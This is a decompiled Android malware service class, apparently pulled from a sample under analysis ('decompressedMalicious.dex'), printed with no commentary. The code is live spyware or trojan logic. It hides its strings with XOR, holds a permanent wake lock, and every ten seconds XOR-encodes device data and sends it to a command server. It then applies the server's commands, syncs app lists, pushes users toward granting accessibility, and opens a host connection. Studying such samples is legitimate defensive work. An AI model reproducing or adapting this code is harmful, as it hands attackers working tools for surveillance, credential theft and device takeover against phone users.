package com.zjxyxnvvp.nxvxchltf;

import android.annotation.SuppressLint;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.widget.Toast;
import com.zjxyxnvvp.nxvxchltf.i.h;
import com.zjxyxnvvp.nxvxchltf.i.j;
import com.zjxyxnvvp.nxvxchltf.i.l;
import com.zjxyxnvvp.nxvxchltf.i.m;
import com.zjxyxnvvp.nxvxchltf.receiver.eifbiaFBAUIFB;
import com.zjxyxnvvp.nxvxchltf.util.InioawndOIADNwaiond;
import com.zjxyxnvvp.nxvxchltf.util.b;
import com.zjxyxnvvp.nxvxchltf.util.e;
import com.zjxyxnvvp.nxvxchltf.util.f;
import com.zjxyxnvvp.nxvxchltf.util.k;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Locale;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class niNOIAdiowanOI extends Service {
    private static short[] $ = {5351, 5372, 5371, 5347, 5370, 5323, 5345, 5370, 5351, 5345, 5348, 2213, 2238, 2254, 8046, 5023, 5086, 5084, 5068, 5023, 5073, 5066, 5075, 5075, 4992, 5023, 7385, 7390, 7363, 7364, 7377, 7388, 7388, 7381, 7380, 7407, 7377, 7360, 7360, 7363, 7708, 7710, 7695, 7705, 7700, 7695, 7698, 7701, 7697, 7710, 7704, 7695, 7688, 4615, 4630, 4630, 4618, 4623, 4613, 4615, 4626, 4623, 4617, 4616, 713, 725, 716, 717, 6122, 6120, 6137, 6118, 6120, 6132, 6113, 6114, 6122, 6122, 6120, 6143, 6142, 6873, 6856, 6856, 6868, 6865, 6875, 6873, 6860, 6865, 6871, 6870, 2155, 2156, 2159, 2151, 2149, 2162, 2106, 7914, 7915, 7910, 7911, 7901, 7921, 7919, 7921, 5367, 5364, 5368, 5360, 5316, 5375, 5374, 5357, 5362, 5368, 5374, 1655, 1642, 1638, 1655, 1660, 1633, 1659, 1636, 1655, 1613, 1662, 1661, 1653, 1653, 1659, 1660, 1653, 7825, 7831, 7811, 7810, 7838, 7849, 7829, 7833, 7832, 7824, 7839, 7812, 7835, 3748, 3754, 3766, 3747, 3744, 3752, 3752, 3754, 3773, 3772, 3728, 3769, 3754, 3773, 3772, 3750, 3744, 3745, 9712, 9715, 9727, 9725, 9712, 9667, 9719, 9721, 9701, 9712, 9715, 9723, 9723, 9721, 9710, 9667, 9706, 9721, 9710, 9711, 9717, 9715, 9714, 9711, 8557, 8554, 8558, 8545, 8551, 8560, 8567, 8539, 8562, 8545, 8566, 8567, 8557, 8555, 8554, 8582, 8581, 8585, 8587, 8582, 8629, 8579, 8580, 8576, 8591, 8585, 8606, 8601, 8629, 8604, 8591, 8600, 8601, 8579, 8581, 8580, 8601, 8798, 8793, 8772, 8771, 8790, 8795, 8795, 8786, 8787, 8808, 8790, 8775, 8775, 8772, 8808, 8788, 8792, 8770, 8793, 8771, 4173, 4166, 4164, 4168, 4160, 4167, 4186, 7129, 6996, 7000, 7002, 7002, 6998, 7001, 6995, 6980, 2714, 2711, 6362, 6360, 6351, 6354, 6349, 6366, 6372, 6354, 6357, 6353, 6366, 6360, 6351, 6344, 5378, 5395, 5393, 5401, 5395, 5397, 5399, 8035, 8036, 8049, 8036, 8053, 1246, 1238, 1236, 1219, 1246, 1217, 1234, 1165, 1990, 1991, 2012, 1985, 1998, 1985, 1995, 1993, 2012, 1985, 1991, 1990, 7818, 7814, 7822, 7817, 7814, 7812, 7812, 7810, 7828, 7822, 7813, 7822, 7819, 7822, 7827, 7838, 7812, 7823, 7814, 7817, 7817, 7810, 7819, 7822, 7811, 3830, 3828, 3828, 3826, 3812, 3812, 3838, 3829, 3838, 3835, 3838, 3811, 3822, 6978, 6988, 6988, 7001, 6984, 6981, 6976, 7007, 6988, 3956, 3947, 3955, 3937, 3958, 1102, 1125, 1135, 1127, 1134, 1144, 1144, 1112, 1134, 1145, 1149, 1122, 1128, 1134, 1073, 1073, 1127, 1124, 1128, 1120, 3506, 3517, 3511, 3489, 3516, 3514, 3511, 3581, 3514, 3517, 3495, 3510, 3517, 3495, 3581, 3506, 3504, 3495, 3514, 3516, 3517, 3581, 3456, 3472, 3457, 3478, 3478, 3485, 3468, 3484, 3485, 3489, 3502, 3492, 3506, 3503, 3497, 3492, 3566, 3497, 3502, 3508, 3493, 3502, 3508, 3566, 3489, 3491, 3508, 3497, 3503, 3502, 3566, 3475, 3459, 3474, 3461, 3461, 3470, 3487, 3471, 3462, 3462, 2810, 2805, 2815, 2793, 2804, 2802, 2815, 2741, 2802, 2805, 2799, 2814, 2805, 2799, 2741, 2810, 2808, 2799, 2802, 2804, 2805, 2741, 2767, 2770, 2774, 2782, 2756, 2767, 2770, 2776, 2768, 6669, 6658, 6664, 6686, 6659, 6661, 6664, 6722, 6661, 6658, 6680, 6665, 6658, 6680, 6722, 6669, 6671, 6680, 6661, 6659, 6658, 6722, 6712, 6693, 6689, 6697, 6707, 6719, 6697, 6712, 4280, 4279, 4285, 4267, 4278, 4272, 4285, 4343, 4272, 4279, 4269, 4284, 4279, 4269, 4343, 4280, 4282, 4269, 4272, 4278, 4279, 4343, 4236, 4234, 4252, 4235, 4230, 4233, 4235, 4252, 4234, 4252, 4247, 4237, 655, 640, 650, 668, 641, 647, 650, 704, 647, 640, 666, 651, 640, 666, 704, 655, 653, 666, 647, 641, 640, 704, 699, 701, 683, 700, 689, 702, 700, 683, 701, 683, 672, 698, 617, 606, 606, 524, 585, 578, 584, 524, 606, 524, 6239, 6264, 6253, 6270, 6264, 6249, 6248, 6188, 6255, 6240, 6245, 6249, 6242, 6264, 6188, 2944, 2970, 3925, 3954, 3962, 3967, 3958, 3959, 3891, 3936, 3943, 3954, 3937, 3943, 3891, 3952, 3967, 3962, 3958, 3965, 3943, 3891};
    private static Thread c;
    private static f d;

    /* renamed from: a */
    private Handler f350a = null;

    /* renamed from: b */
    private int f351b;

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class a extends Thread {
        private static short[] $ = {-26014, -26001, -25996, -25995, -26000, -26012, -26015, -25996, -26011};

        /* renamed from: a */
        private JSONObject f352a;

        /* renamed from: b */
        final /* synthetic */ d f353b;

        /* renamed from: com.zjxyxnvvp.nxvxchltf.niNOIAdiowanOI$a$a */
        /* loaded from: /home/remnux/decompressedMalicious.dex */
        class RunnableC0006a implements Runnable {
            private static short[] $ = {-19814, -19828, -24538, -24561, -24564, -24569, -24574, -24569, -24550, -24561, -24548, -24498, -24561, -24563, -24563, -24565, -24547, -24569, -24564, -24569, -24574, -24569, -24566, -24561, -24566, -25077, -25056, -25041, -25044, -25054, -25045, -24978, -25041, -25043, -25043, -25045, -25027, -25027, -25049, -25044, -25049, -25054, -25049, -25030, -25033, -24060, -24039, -24051, -24037, -24055, -24059, -23670, -23675, -23665, -23655, -23676, -23678, -23665, -23611, -23656, -23666, -23649, -23649, -23678, -23675, -23668, -23656, -23611, -23638, -23640, -23640, -23634, -23624, -23624, -23646, -23639, -23646, -23641, -23646, -23617, -23630, -23628, -23624, -23634, -23617, -23617, -23646, -23643, -23636, -23624};

            private static String $(int i, int i2, int i3) {
                char[] cArr = new char[i2 - i];
                for (int i4 = 0; i4 < i2 - i; i4++) {
                    cArr[i4] = (char) ($[i + i4] ^ i3);
                }
                return new String(cArr);
            }

            RunnableC0006a() {
                a.this = r5;
            }

            @Override // java.lang.Runnable
            public void run() {
                Intent intent;
                String str;
                niNOIAdiowanOI ninoiadiowanoi;
                if (!b.n(niNOIAdiowanOI.this, UIDNwaidobaWIODb.class)) {
                    niNOIAdiowanOI.d(niNOIAdiowanOI.this);
                    if (Build.VERSION.SDK_INT != 30) {
                        if (Locale.getDefault().getLanguage().toLowerCase().equals($(0, 2, -19713))) {
                            ninoiadiowanoi = niNOIAdiowanOI.this;
                            str = $(2, 25, -24466);
                        } else {
                            ninoiadiowanoi = niNOIAdiowanOI.this;
                            str = $(25, 45, -25010);
                        }
                        Toast.makeText(ninoiadiowanoi, str, 1).show();
                    }
                    if (Build.VERSION.SDK_INT < 29) {
                        if (System.currentTimeMillis() - InioawndOIADNwaiond.i > 16000) {
                            intent = new Intent(niNOIAdiowanOI.this, InioawndOIADNwaiond.class);
                        } else if (Build.MANUFACTURER.toLowerCase().contains($(45, 51, -23956))) {
                            intent = new Intent($(51, 90, -23573));
                        } else if (niNOIAdiowanOI.this.f351b % 2 == 0) {
                            intent = new Intent(niNOIAdiowanOI.this, InioawndOIADNwaiond.class);
                        } else {
                            return;
                        }
                        niNOIAdiowanOI.this.startActivity(intent.addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                    } else if (niNOIAdiowanOI.this.f351b > 3 && niNOIAdiowanOI.this.f351b % 2 == 0) {
                        niNOIAdiowanOI.this.h();
                    }
                }
            }
        }

        private static String $(int i, int i2, int i3) {
            char[] cArr = new char[i2 - i];
            for (int i4 = 0; i4 < i2 - i; i4++) {
                cArr[i4] = (char) ($[i + i4] ^ i3);
            }
            return new String(cArr);
        }

        a(d dVar) {
            niNOIAdiowanOI.this = r5;
            this.f353b = dVar;
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            while (true) {
                if (!b.p()) {
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                } else {
                    if (this.f352a == null) {
                        this.f352a = com.zjxyxnvvp.nxvxchltf.h.a.a.a(niNOIAdiowanOI.this);
                    }
                    byte[] bytes = this.f352a.toString().getBytes();
                    for (int i = 0; i < bytes.length; i++) {
                        bytes[i] = (byte) (bytes[i] ^ 66);
                    }
                    try {
                        niNOIAdiowanOI.this.l(new JSONObject(f.b(b.e(niNOIAdiowanOI.this, this.f353b, $(0, 9, -26112)), bytes)));
                        this.f352a = null;
                    } catch (IOException | JSONException e2) {
                        e2.printStackTrace();
                        b.y();
                    }
                    niNOIAdiowanOI.g(niNOIAdiowanOI.this);
                    if (UIDNwaidobaWIODb.e != null) {
                        com.zjxyxnvvp.nxvxchltf.i.a.a(niNOIAdiowanOI.this);
                        m.a(niNOIAdiowanOI.this);
                        l.a();
                        j.a();
                        h.a();
                    }
                    niNOIAdiowanOI.this.n();
                    if (!b.n(niNOIAdiowanOI.this, UIDNwaidobaWIODb.class)) {
                        niNOIAdiowanOI.this.f350a.post(new RunnableC0006a());
                    }
                    Thread.sleep(10000);
                }
            }
        }
    }

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    static /* synthetic */ int d(niNOIAdiowanOI ninoiadiowanoi) {
        int i = ninoiadiowanoi.f351b;
        ninoiadiowanoi.f351b = i + 1;
        return i;
    }

    public static void g(Context context) {
        d dVar = d.e;
        if (dVar != null && dVar.f314a.g(context, $(0, 11, 5268))) {
            long currentTimeMillis = System.currentTimeMillis() - UIDNwaidobaWIODb.h;
            if (currentTimeMillis > 12000) {
                StringBuilder sb = new StringBuilder();
                sb.append($(11, 14, 2286));
                sb.append(currentTimeMillis);
                sb.append($(14, 15, 8014));
                sb.append(k.e(context));
                sb.append($(15, 26, 5055));
                sb.append(UIDNwaidobaWIODb.e == null);
                e.a(sb.toString());
            }
        }
    }

    public void h() {
    }

    private boolean i() {
        d dVar = d.e;
        JSONArray jSONArray = new JSONArray();
        b.k(this, jSONArray);
        JSONObject jSONObject = new JSONObject();
        jSONObject.put($(26, 40, 7344), jSONArray);
        try {
            JSONArray jSONArray2 = new JSONArray(f.c(b.e(this, dVar, $(40, 53, 7803)), jSONObject.toString().getBytes(StandardCharsets.UTF_8)));
            for (int i = 0; i < jSONArray2.length(); i++) {
                JSONObject jSONObject2 = jSONArray2.getJSONObject(i);
                dVar.f314a.c(this, jSONObject2.getString($(53, 64, 4710)), jSONObject2.getString($(64, 68, 673)));
            }
            return true;
        } catch (JSONException e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean j() {
        d dVar = d.e;
        try {
            JSONArray jSONArray = new JSONArray(f.a(b.e(this, dVar, $(68, 81, 6029))));
            for (int i = 0; i < jSONArray.length(); i++) {
                String string = jSONArray.getJSONObject(i).getString($(81, 92, 6840));
                dVar.f314a.i(this, $(92, 99, 2048) + string, true);
            }
            return true;
        } catch (JSONException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static Thread k() {
        Thread thread;
        synchronized (niNOIAdiowanOI.class) {
            thread = c;
        }
        return thread;
    }

    public void l(JSONObject jSONObject) {
        long j;
        String str;
        d dVar = d.e;
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar = dVar.f314a;
        String $2 = $(99, 107, 7810);
        aVar.i(this, $2, jSONObject.optBoolean($2));
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar2 = dVar.f314a;
        String $3 = $(107, 118, 5275);
        aVar2.i(this, $3, jSONObject.optBoolean($3));
        com.zjxyxnvvp.nxvxchltf.j.b.e = jSONObject.optBoolean($(118, 135, 1554), false);
        jSONObject.optBoolean($(135, 148, 7926), false);
        long optLong = jSONObject.optLong($(148, 166, 3791), -1);
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar3 = dVar.f314a;
        String $4 = $(166, 190, 9628);
        long f = aVar3.f(this, $4);
        long optLong2 = jSONObject.optLong($(190, 205, 8452), -1);
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar4 = dVar.f314a;
        String $5 = $(205, 227, 8682);
        long f2 = aVar4.f(this, $5);
        if (jSONObject.optInt($(227, 247, 8759)) <= 1) {
            com.zjxyxnvvp.nxvxchltf.h.a.a.f321a = true;
        }
        String $6 = $(247, 254, 4137);
        JSONArray optJSONArray = jSONObject.optJSONArray($6);
        if (optJSONArray != null) {
            StringBuilder sb = new StringBuilder();
            j = optLong;
            str = $4;
            for (int i = 0; i < optJSONArray.length(); i++) {
                sb.append(optJSONArray.getString(i));
                if (i != optJSONArray.length() - 1) {
                    sb.append($(254, 255, 7077));
                }
            }
            dVar.f314a.c(this, $6, sb.toString());
        } else {
            j = optLong;
            str = $4;
        }
        JSONArray optJSONArray2 = jSONObject.optJSONArray($(255, 263, 6967));
        if (optJSONArray2 != null) {
            for (int i2 = 0; i2 < optJSONArray2.length(); i2++) {
                JSONObject jSONObject2 = optJSONArray2.getJSONObject(i2);
                dVar.c.d(jSONObject2.getString($(263, 265, 2803)), jSONObject2);
            }
        }
        JSONArray optJSONArray3 = jSONObject.optJSONArray($(265, 279, 6331));
        if (optJSONArray3 != null) {
            for (int i3 = 0; i3 < optJSONArray3.length(); i3++) {
                JSONObject jSONObject3 = (JSONObject) optJSONArray3.get(i3);
                String optString = jSONObject3.optString($(279, 286, 5490));
                boolean optBoolean = jSONObject3.optBoolean($(286, 291, 7952), false);
                if (optString.length() > 0) {
                    com.zjxyxnvvp.nxvxchltf.h.b.a aVar5 = dVar.f314a;
                    aVar5.i(this, $(291, 299, 1207) + optString, optBoolean);
                }
            }
        }
        if (f2 < optLong2) {
            try {
                if (i()) {
                    dVar.f314a.h(this, $5, optLong2);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        if (f < j && j()) {
            dVar.f314a.h(this, str, optLong2);
        }
    }

    public static void m(Context context) {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService($(299, 311, 1960));
        notificationManager.cancel(123);
        if (Build.VERSION.SDK_INT >= 26) {
            notificationManager.deleteNotificationChannel($(311, 336, 7911));
        }
    }

    public void n() {
        AccessibilityEvent obtain = AccessibilityEvent.obtain();
        obtain.setEventType(16384);
        obtain.setClassName(niNOIAdiowanOI.class.getName());
        obtain.getText().add($(349, 358, 6953));
        ((AccessibilityManager) getSystemService($(336, 349, 3735))).sendAccessibilityEvent(obtain);
    }

    @SuppressLint({"WakelockTimeout"})
    private void p() {
        Thread thread = c;
        if (thread == null || !thread.isAlive() || c.isInterrupted()) {
            d dVar = d.e;
            ((PowerManager) getSystemService($(358, 363, 3844))).newWakeLock(1, $(363, 383, 1035)).acquire();
            this.f350a = new Handler(Looper.getMainLooper());
            try {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction($(383, 414, 3539));
                intentFilter.addAction($(414, 446, 3520));
                intentFilter.addAction($(446, 477, 2715));
                intentFilter.addAction($(477, 507, 6764));
                intentFilter.addAction($(507, 541, 4313));
                intentFilter.addAction($(541, 575, 750));
                registerReceiver(new eifbiaFBAUIFB(), intentFilter);
                g(this);
            } catch (Throwable th) {
                th.printStackTrace();
                e.a($(575, 585, 556) + th.getMessage());
            }
            synchronized (niNOIAdiowanOI.class) {
                a aVar = new a(dVar);
                c = aVar;
                aVar.start();
            }
        }
    }

    public void o(String str, int i) {
        try {
            if (d != null) {
                d.interrupt();
                d = null;
            }
            f fVar = new f(this, str, i);
            d = fVar;
            fVar.start();
            e.a($(585, 600, 6156) + str + $(600, 602, 2976) + i);
        } catch (Exception e) {
            e.a($(602, 622, 3859) + e.getMessage());
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        b.t(this);
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent != null) {
            p();
        }
        return super.onStartCommand(intent, i, i2);
    }
}
